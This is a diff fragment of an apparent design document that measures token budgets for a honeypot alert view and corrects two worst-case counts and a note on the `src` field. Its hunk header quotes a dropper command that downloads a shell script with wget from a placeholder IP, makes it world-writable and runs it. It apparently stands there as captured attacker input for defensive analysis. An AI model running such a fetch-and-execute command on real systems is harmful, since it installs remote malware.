@@ -163,13 +163,13 @@ cd /tmp || cd /var/run; wget http://198.51.100.7/bins.sh; chmod 777 bins.sh; sh 
 
 | Variant | Tokens |
 |---|---|
-| Worst case, cap 128 | 1,231 |
+| Worst case, cap 128 | 1,240 |
 | **Worst case, cap 200 (frozen)** | **1,324** |
-| Worst case, cap 256 | 1,390 |
+| Worst case, cap 256 | 1,399 |
 | One command sequence at cap 200 | 87 |
 | Action catalog v0.1, IDs and descriptions only (8 actions) | 166 |
 | Action catalog v0.1, whole YAML file | 2,914 |
 
 The view is bounded at about 1,324 tokens, while a raw bundle grows by about 104 tokens per alert (1,351 ÷ 13). The ratio on busy windows is therefore much higher than 2.78 (§10).
 
-The cap-128 and cap-256 rows measure honeypot `src` without the session port; the frozen row includes it.
+All three worst-case rows include the session port in honeypot `src`.
